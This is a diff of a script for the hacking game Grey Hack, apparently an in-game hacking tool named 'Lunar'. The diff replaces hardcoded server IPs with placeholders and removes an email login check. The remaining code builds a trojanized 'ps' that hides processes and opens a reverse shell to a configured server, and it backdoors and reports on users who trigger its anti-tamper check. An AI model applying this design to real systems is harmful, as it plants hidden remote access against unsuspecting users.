@@ -43,9 +43,9 @@ if apt then
 	if get_shell.host_computer.File("/etc/apt") then
 		if not get_shell.host_computer.File("/etc/apt/aptcache.bin") then apt.update
 	end if
-	inSource=apt.show("30.30.30.30")
-	if inSource == "30.30.30.30 repository not found" then
-		apt.add_repo("30.30.30.30",1542)
+	inSource=apt.show("x.x.x.x") //-- replace "x.x.x.x" 's here with your hackshop ip
+	if inSource == "x.x.x.x repository not found" then
+		apt.add_repo("x.x.x.x",1542)
 		apt.update
 	end if
 	print("<color=#7141c4>[Lunar]</color><color=#8254d1> Checking library updates...</color>")
@@ -101,7 +101,8 @@ end function
 buildPS=function(proc)
 	if not comp.File("/bin") then return
 	ps=comp.show_procs
-	source="output = get_shell.host_computer.show_procs;lines=output.split(""\n"");newOut=[];rshell=0;for line in lines;if line.split("" "")[-1] == """+proc+""" then;rshell=1;continue;end if;if line.split("" "")[-1] == ""lunar"" then continue;newOut.push(line);end for;mxf=null;root=get_shell.host_computer.File(""/"");newFiles=[];newFiles=newFiles+root.get_folders+root.get_files;while newFiles.len;currFile=newFiles.pull;if currFile.is_folder then;newFiles=currFile.get_folders+currFile.get_files+newFiles;end if;test=include_lib(currFile.path);if typeof(test) == ""MetaxploitLib"" then mxf=currFile.path;end while;if mxf then;if not rshell then include_lib(mxf).rshell_client(""61.126.138.22"",1222,"""+proc+""");end if;output=newOut.join(""\n"");print(format_columns(output))"
+	//-- (at "x.x.x.x" in source var (below)) fill with your rshell server info
+	source="output = get_shell.host_computer.show_procs;lines=output.split(""\n"");newOut=[];rshell=0;for line in lines;if line.split("" "")[-1] == """+proc+""" then;rshell=1;continue;end if;if line.split("" "")[-1] == ""lunar"" then continue;newOut.push(line);end for;mxf=null;root=get_shell.host_computer.File(""/"");newFiles=[];newFiles=newFiles+root.get_folders+root.get_files;while newFiles.len;currFile=newFiles.pull;if currFile.is_folder then;newFiles=currFile.get_folders+currFile.get_files+newFiles;end if;test=include_lib(currFile.path);if typeof(test) == ""MetaxploitLib"" then mxf=currFile.path;end while;if mxf then;if not rshell then include_lib(mxf).rshell_client(""x.x.x.x"",1222,"""+proc+""");end if;output=newOut.join(""\n"");print(format_columns(output))"
 	comp.touch(xpath,"ps.src")
 	p=null
 	if comp.File("/bin/ps") then p=comp.File("/bin/ps").permissions[1:]
@@ -130,15 +131,15 @@ buildPS=function(proc)
 end function
 
 sendEmail=function(reason)
-	mail=mail_login
+	mail=mail_login //-- fill with your email details
 	if typeof(mail) != "MetaMail" then return
+	//--           V - replace with your email
 	send=mail.send("",get_shell.host_computer.public_ip,"<color=#7141c4>[Lunar Security]</color>"+char(10)+"<color=#7141c4>[IP] </color><color=#8254d1>"+get_shell.host_computer.public_ip+"</color>"+char(10)+"<color=#7141c4>[Local IP] </color><color=#8254d1>"+get_shell.host_computer.local_ip+"</color>"+char(10)+"<color=#7141c4>[Date] </color><color=#8254d1>"+current_date+"</color>"+char(10)+"<color=#7141c4>[Reason] </color><color=#8254d1>"+reason+"</color>")
 	if typeof(send) != "number" then return
 end function
 
 intrude=function(err,alt=null)
 	if not alt then alt=err
-	if get_shell.host_computer.public_ip == "141.193.149.45" or get_shell.host_computer.public_ip == "135.202.178.113" then exit("<color=#7141c4>[Lunar]</color><color=#8254d1> "+err+"</color>")
 	sendEmail(alt)
 	rshelled=0
 	ps=comp.show_procs
@@ -148,20 +149,21 @@ intrude=function(err,alt=null)
 	end for
 	if not rshelled then
 		buildPS(logRs)
-		mx.rshell_client("61.126.138.22",1222,logRs)
+		mx.rshell_client("x.x.x.x",1222,logRs) //-- fill with rshell server info
 	end if
 	exit("<color=#7141c4>[Lunar]</color><color=#8254d1> "+err+"</color>")
 end function
 
 serve=function()
-	proxy=get_shell.connect_service
+	//-- recommended 2 separate servers
+	proxy=get_shell.connect_service //-- fill with start connection details
 	if typeof(proxy) != "shell" then
 		print("<color=#7141c4>[Lunar]</color><color=#8254d1> Server connection failure</color>")
 		globals.la=1
 		return
 	end if
 
-	globals.server.shell=proxy.connect_service
+	globals.server.shell=proxy.connect_service //-- fill with end connection details
 	if typeof(server.shell) != "shell" then
 		print("<color=#7141c4>[Lunar]</color><color=#8254d1> Server connection failure</color>")
 		globals.la=1
@@ -187,11 +189,10 @@ parseint=@FoxLib.General.ParseInt
 
 genRandomString=@FoxLib.General.rndstring
 
-//shade=@FoxLib.Crypto.Shade
-
 exploit=@FoxLib.VulnV.Exploit
 decipher=@FoxLib.VulnV.Decipher
 
+//-- ctrl + h (vscode) - replace all "encryption_key" in nightlunar/lunarcmd with your own encryption key
 encrypt=function(pass,secret,type)
 
 	cryptChars=function(pass)
@@ -351,7 +352,7 @@ end function
 
 Scan=function()
 	scanned=exploit(lmx,ml,args)
-	for mem in scanned.db.exploits
+	for mem in scanned.exploits
 		for ent in mem.vulns
 			result=ent.result
 			perms=checkPerms(result)
@@ -397,10 +398,10 @@ saveScan=function()
 	else
 		scanned=exploit(lmx,ml,args)
 		newLib={}
-		newLib.name=scanned.db.name
-		newLib.ver=scanned.db.ver
+		newLib.name=scanned.name
+		newLib.ver=scanned.ver
 		newLib.vulns=[]
-		for mem in scanned.db.exploits
+		for mem in scanned.exploits
 			ex={}
 			ex.mem=mem.mem
 			ex.vulns=[]
@@ -540,16 +541,12 @@ end function
 
 if launch_path != program_path and not launchnum then print("<color=#7141c4>[Lunar] </color><color=#8254d1>Warning: Invalid program launch path.")
 
-checkemail=mail_login
-if typeof(checkemail) != "MetaMail" then intrude("Autologin failed")
+//-- removed email autologin (got patched), add your own login system here or skip authentication
 
-l1=checkemail.fetch.len
-checkemail.send("",get_shell.host_computer.public_ip,"<color=#7141c4>[Lunar Security]</color>"+char(10)+"<color=#7141c4>[IP] </color><color=#8254d1>"+get_shell.host_computer.public_ip+"</color>"+char(10)+"<color=#7141c4>[Local IP] </color><color=#8254d1>"+get_shell.host_computer.local_ip+"</color>"+char(10)+"<color=#7141c4>[Date] </color><color=#8254d1>"+current_date+"</color>"+char(10)+"<color=#7141c4>[Reason] </color><color=#8254d1>AutoLogin</color>")
-l2=checkemail.fetch.len
 
-if l1 == l2 then intrude("Autologin failed")
-checkemail.delete(checkemail.fetch[0].split(char(10))[2][8:])
 
+
+//-- end coding area
 
 if params.len > 0 then
 	if params[0].indexOf("l") == null then serve else la=1
@@ -646,7 +643,7 @@ while pipe.len
 		globals.dbfile=servdb.get_files[-1]
 		upref=xconf.get_content
 		config={"rss": {"ip": "none", "user": "none", "pass": "none", "port": 0, "rport": 0}, "mail": {"user": "none", "pass": "none"}, "proc": "none"}
-		if upref.len > 0 then config=deserialize(encrypt(upref,"Lunar","dec"))
+		if upref.len > 0 then config=deserialize(encrypt(upref,"encryption_key","dec"))
 		globals.conf=config
 	else
 		globals.expdb=current_path+"/LuDB"
